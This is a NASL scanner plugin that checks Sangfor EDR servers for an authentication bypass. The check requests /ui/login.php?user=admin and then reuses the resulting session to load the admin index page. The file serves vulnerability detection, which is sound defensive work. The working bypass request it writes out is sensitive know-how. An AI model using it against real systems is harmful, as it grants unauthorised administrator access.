############################################################
# Author: ox50sec@webray.com.cn
# Copyright @WebRAY
############################################################
include("compat.inc");


if (description)
{
  script_id(51799283);
  script_version("1.3");
  script_name(english:"sangfor_edr_Permission bypass");
  script_summary(english:"sangfor_edr_Permission bypass");
  script_set_attribute(attribute:"risk_factor", value:"High");
  script_set_attribute(attribute:"description", value:"sangfor_edr_Permission bypass");
  script_set_attribute(attribute:"solution", value:"update system");
  script_set_attribute(attribute:"vuln_publication_date",value:"2018/10/11");
  script_set_attribute(attribute:"patch_publication_date",value:"2018/10/11");
  script_set_attribute(attribute:"plugin_publication_date", value:"2018/10/22");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"in_the_news", value:"true");
  script_end_attributes();
  script_family(english:"Web Servers");
  script_dependencies("find_service.nasl", "http_version.nasl","sangfor_edr_detect.nasl");
  script_category(ACT_ATTACK);
  script_copyright(english:"This script is Copyright (C) WebRAY, Inc.");
  script_require_keys("www/Sangfor_Edr");
  script_require_ports("Services/www", 80, 443);
  exit(0);
}



include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("openvas-https2.inc");


function check_vuln(port){
	url = "/ui/login.php?user=admin";
	req = http_send_recv3(method: "GET", port: port, item: url, add_headers: make_array("User_Agent", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0","Content-Type","application/x-www-form-urlencoded"),follow_redirect:1);
	if("302">< req[0] && "Location: index.php" >< req[1]){
		url2 = "/ui/index.php";
		res = http_send_recv3(method: "GET", port: port, item: url2, add_headers: make_array("User_Agent", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0","Content-Type","application/x-www-form-urlencoded"));
		if ("200" >< res[0] && "isAdmin:" >< res[2] && "userName : 'admin'" >< res[2]){
				security_hole(port:port, extra:res[2]);
			}
		}
}

function check_vuln_ssl(port){
    req = http_get(item:"/ui/login.php?user=admin",port:port);
	ssl_req = https_req_get(port:port , request:req);
	if("302"><ssl_req && "Set-Cookie" >< ssl_req && "Location:" >< ssl_req){
		Cookie = eregmatch(pattern:"Set-Cookie: ([a-z0-9A-Z=]+);", string:ssl_req, icase:TRUE);
		var res = 
		'GET /ui/index.php HTTP/1.1\r\n' +
		'Host: ' + get_host_ip() + '\r\n' +
		'Content-Type: application/x-www-form-urlencoded' + '\r\n' +
		'Cookie: '+ Cookie[1] + '\r\n' +
		'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0' + '\r\n' +
		'Accept: */*' + '\r\n' + '\r\n';
		ssl_res = https_req_get(port:port , request:res);
        if ("200" >< ssl_res && "isAdmin:" >< ssl_res && "userName : 'admin'" >< ssl_res){
            security_hole(port:port, extra:ssl_res);
        }
	
	}
}
##################################
kbs = get_kb_list("www/banner/*");
foreach k (keys(kbs)) {
	port = substr(k,11);
	ssl = get_kb_list("SSL/Transport/"+port);
	if(!ssl) {
   		check_vuln(port:port);
	} else {
   		check_vuln_ssl(port:port);
	}
}
